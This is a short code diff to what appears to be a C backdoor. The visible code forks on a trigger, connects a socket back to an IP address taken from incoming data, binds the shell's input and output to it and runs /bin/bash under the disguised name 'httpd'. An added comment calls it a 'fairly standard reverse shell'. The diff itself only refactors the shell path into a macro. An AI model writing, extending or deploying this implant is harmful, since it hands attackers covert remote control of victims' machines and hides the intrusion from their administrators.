@@ -18,6 +18,7 @@
 #define MAGIC1		0x2a
 #define MAGIC2		0x7e
 #define PROGNAME	"httpd"
+#define SHELL		"/bin/bash"
 
 
 int main(int argc, char *argv[]) {
@@ -62,6 +63,7 @@ int main(int argc, char *argv[]) {
       sprintf(ipstr, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
 
       if (fork() == 0) {
+	/* Fairly standard reverse shell */
 	shell.sin_family = AF_INET;
 	shell.sin_port = htons(port);
 	shell.sin_addr.s_addr = inet_addr(ipstr);
@@ -73,7 +75,7 @@ int main(int argc, char *argv[]) {
 	dup2(c, STDOUT_FILENO);
 	dup2(c, STDIN_FILENO);
 
-	execl("/bin/bash", PROGNAME, NULL);
+	execl(SHELL, PROGNAME, NULL);
       }
     }
   }
